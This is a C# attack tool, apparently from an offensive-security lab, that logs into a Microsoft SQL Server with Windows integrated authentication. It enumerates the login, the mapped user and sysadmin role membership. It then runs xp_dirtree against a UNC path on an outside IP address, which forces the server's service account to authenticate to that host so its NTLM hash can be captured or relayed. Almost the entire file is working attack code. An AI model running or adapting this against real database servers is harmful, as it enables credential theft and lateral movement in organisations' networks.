using System;
using System.Data.SqlClient;

namespace mssql_exp
{
    internal class Program
    {

        public static String executeQuery(String query, SqlConnection con)
        {
            SqlCommand cmd = new SqlCommand(query, con);
            SqlDataReader reader = cmd.ExecuteReader();
            try
            {
                String result = "";
                while (reader.Read() == true)
                {
                    result += reader[0] + "\n";
                }
                reader.Close();
                return result;
            }
            catch
            {
                return "";
            }
        }
        public static void getGroupMembership(String groupToCheck, SqlConnection con)
        {
            String res = executeQuery($"SELECT IS_SRVROLEMEMBER('{groupToCheck}');", con);
            int role = int.Parse(res);
            if (role == 1)
            {
                Console.WriteLine($"[+] User is a member of the '{groupToCheck}' group.");
            }
            else
            {
                Console.WriteLine($"[-] User is not a member of the '{groupToCheck}' group.");
            }
        }

        static void Main(string[] args)
        {
            String sqlServer = "dc01.corp1.com";
            // default database, always present
            String database = "master";
            // Integrated Security means Keberos auth
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth Successful!");
            }
            catch
            {
                Console.WriteLine("Auth failed!");
                Environment.Exit(0);

            }

            //Enumeration

            String login = executeQuery("SELECT SYSTEM_USER;", con);
            Console.WriteLine("Logged in as: " + login);
            String username = executeQuery("SELECT USER_NAME();", con);
            Console.WriteLine("Mapped to the user: " + username);
            getGroupMembership("public", con);

            getGroupMembership("sysadmin", con);

            // UNC Path Injection with xp_dirtree proc UNC must be with IP

            String unc_path = executeQuery("EXEC master..xp_dirtree \"\\\\192.168.49.155\\\\test\";",con);



            con.Close();
        }
    }
}
